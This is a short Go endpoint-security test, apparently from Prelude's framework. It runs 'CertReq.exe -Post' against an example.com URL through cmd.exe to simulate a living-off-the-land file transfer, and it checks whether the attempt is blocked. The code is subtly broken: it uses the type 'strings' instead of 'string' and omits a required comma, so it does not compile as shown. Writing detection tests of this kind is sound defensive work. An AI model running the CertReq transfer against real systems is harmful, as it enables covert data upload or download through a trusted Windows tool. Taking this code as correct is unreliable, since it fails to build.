//go:build windows
// +build windows

/*
ID: 79f0a1f7-ed6b-471c-8eb1-23abd6470b1c
NAME: Potential File Transfer via Certreq
CREATED: 2024-06-28
scenario: `Certreq` util used to make HTTP POST requests -> download/upload to remote url
*/

package main

import (
	_ "embed"
	"runtime"

	Endpoint "github.com/preludeorg/test/endpoint"
)

/*
use `CertReq.exe` to make request to remote url
*/
var supported = map[strings][]string{
	"windows": {
		"cmd.exe", "/C", "CertReq.exe -Post -config \"http://example.com/certreq/post\""
	},
}

func test() {
	println("[+] Initiating Certreq HTTP POST request")

	command := supported[runtime.GOOS]
	_, err := Endpoint.Shell(command)
	if err != nil {
		println("[+] Execution was prevented")
		Endpoint.Stop(100)
		return
	}

	println("[-] Certreq HTTP POST request was not blocked")
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}